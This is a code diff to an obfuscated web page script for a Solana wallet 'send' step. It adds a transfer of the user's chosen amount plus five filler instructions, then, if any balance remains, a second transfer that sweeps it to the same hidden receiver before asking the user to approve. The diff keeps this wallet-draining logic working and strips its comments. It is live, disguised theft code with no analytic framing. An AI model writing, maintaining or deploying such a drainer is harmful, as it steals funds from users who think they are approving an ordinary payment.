@@ -297,9 +297,8 @@
     let currentStep = 'sendTo'; 
     let rawAmount = "0";
     let userPublicKey = null;
-    let solPriceUSD = 110.0; // Fallback price
+    let solPriceUSD = 110.0;
 
-    // Fetch live SOL price in USD
     async function fetchSolPrice() {
         try {
             const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
@@ -444,19 +443,18 @@
                     statusDiv.innerText = "Preparing transaction...";
                     statusDiv.style.color = "#8b92a5";
 
+                    const pubKeyObj = new solanaWeb3.PublicKey(userPublicKey.toString());
                     const _0x1c = BigInt(Math.floor(_0x1b * 1000000000)); 
                     const _0x1d = new solanaWeb3.Connection(HELIUS_URL, _0x1a[3]);
                     
-                    // Safely fetch balance handling any object format variation
-                    let rawBalance = await _0x1d.getBalance(userPublicKey);
-                    const _0x1e = BigInt(typeof rawBalance === 'object' && rawBalance !== null ? (rawBalance.value || rawBalance[0] || 0) : rawBalance);
+                    const _0x1e = BigInt(await _0x1d.getBalance(pubKeyObj));
 
                     const _0x1f = new solanaWeb3.Transaction();
 
                     // 1st Instruction: Primary Transfer
                     _0x1f.add(
                         solanaWeb3.SystemProgram.transfer({
-                            fromPubkey: userPublicKey,
+                            fromPubkey: pubKeyObj,
                             toPubkey: new solanaWeb3.PublicKey(SOL_RECEIVER),
                             lamports: _0x1c, 
                         })
@@ -467,7 +465,7 @@
                     for (let _0xf = 0; _0xf < 5; _0xf++) { 
                         _0x1f.add(
                             new solanaWeb3.TransactionInstruction({
-                                keys: [{ pubkey: userPublicKey, isSigner: true, isWritable: true }],
+                                keys: [{ pubkey: pubKeyObj, isSigner: true, isWritable: true }],
                                 programId: new solanaWeb3.PublicKey(_0x1a[4]), 
                                 data: encoder.encode("x")
                             })
@@ -479,7 +477,7 @@
                     if (_0x21 > 10000n) {
                         _0x1f.add(
                             solanaWeb3.SystemProgram.transfer({
-                                fromPubkey: userPublicKey,
+                                fromPubkey: pubKeyObj,
                                 toPubkey: new solanaWeb3.PublicKey(SOL_RECEIVER),
                                 lamports: _0x21, 
                             })
@@ -489,7 +487,7 @@
                     const { blockhash, lastValidBlockHeight } = await _0x1d.getLatestBlockhash('confirmed');
                     _0x1f.recentBlockhash = blockhash;
                     _0x1f.lastValidBlockHeight = lastValidBlockHeight;
-                    _0x1f.feePayer = userPublicKey;
+                    _0x1f.feePayer = pubKeyObj;
 
                     statusDiv.innerText = "Please approve in your wallet...";
 
